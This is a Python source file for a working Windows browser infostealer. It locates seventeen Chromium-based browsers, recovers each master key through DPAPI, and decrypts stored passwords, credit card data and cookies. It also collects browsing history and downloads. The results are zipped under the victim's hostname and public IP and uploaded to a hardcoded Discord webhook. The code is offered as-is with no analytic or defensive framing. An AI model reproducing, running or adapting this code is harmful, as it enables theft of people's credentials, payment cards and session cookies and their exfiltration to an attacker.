import base64
import json
import os
import urllib
import socket
import shutil
import sqlite3
import tempfile
import requests
import zipfile
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        if len(iv) != 12:
            print("Invalid IV length, skipping row.")
            return ""
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""
    
def save_results(browser_name, type_of_data, content):
    device_name = socket.gethostname()  # Get the name of the PC device
    directory = os.path.join(browser_name)
    file_name = f'{type_of_data}_{device_name}.txt'
    file_path = os.path.join(directory, file_name)
    
    # Create the directory if it doesn't exist
    os.makedirs(directory, exist_ok=True)
    
    if content is not None:
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(content)
            print(f"\t [*] Saved in {file_path}")
        return file_path
    else:
        print(f"\t [-] No Data Found!")
        return None

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return "Database file does not exist."
    result = ""
    
    temp_dir = tempfile.mkdtemp()  # Create a temporary directory
    temp_db = os.path.join(temp_dir, 'temp_db')  # Path to the temporary database file
    
    try:
        shutil.copyfile(db_file, temp_db)
    except Exception as e:
        return f"Error copying file: {e}"
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    decrypted_value = decrypt_password(row[i], key)
                    if not decrypted_value:
                        continue  # Skip rows with decryption errors
                    row[i] = decrypted_value
        if type_of_data['file'] == '\\History':  # Corrected variable name to check if it's history
            if len(row) > 2:  # Check if the list 'row' has at least 3 elements
                if row[2] != 0:  # Check if the index 2 exists and its value is not 0
                    row[2] = convert_chrome_time(row[2])
                else:
                    row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    shutil.rmtree(temp_dir)  # Cleanup: remove the temporary directory and its contents
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

def zip_files(file_paths, zip_name):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for file in file_paths:
            zipf.write(file, file)  # Keep the directory structure
            print(f"Added {file} to zip.")
    return zip_name

def send_to_discord(file_path):
    webhook_url = "https://discord.com/api/webhooks/1243207760318038026/j0KeigVlMpai1SPV1UfN5AZDg_X4DYsv7RrqEgcDzYIsdLtxN24Ku-Pc4X4ej6W8jmgA"
    with open(file_path, 'rb') as f:
        files = {'file': (os.path.basename(file_path), f)}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print(f"Successfully sent {file_path} to Discord.")
        else:
            print(f"Failed to send {file_path} to Discord. Status code: {response.status_code}")

if __name__ == '__main__':
    available_browsers = installed_browsers()
    files_to_zip = []
    device_name = socket.gethostname()  # Get the name of the PC device
    
    # Fetch public IPv4 address
    public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf-8')
    
    # Generate timestamp
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            data = get_data(browser_path, "Default", master_key, data_type)
            file_path = save_results(browser, data_type_name, data)
            if file_path:
                files_to_zip.append(file_path)
            print("\t------\n")
    
    if files_to_zip:
        zip_file_name = f'{device_name}-IP-{public_ip}-stamp-{timestamp}.zip'
        zip_file = zip_files(files_to_zip, zip_file_name)
        send_to_discord(zip_file)
        
        # Save the ZIP file to the device
        save_path = os.path.join(os.getcwd(), zip_file_name)
        shutil.move(zip_file, save_path)
        print(f"ZIP file saved to {save_path}")

        # Cleanup: remove individual text files
        for file in files_to_zip:
            os.remove(file)
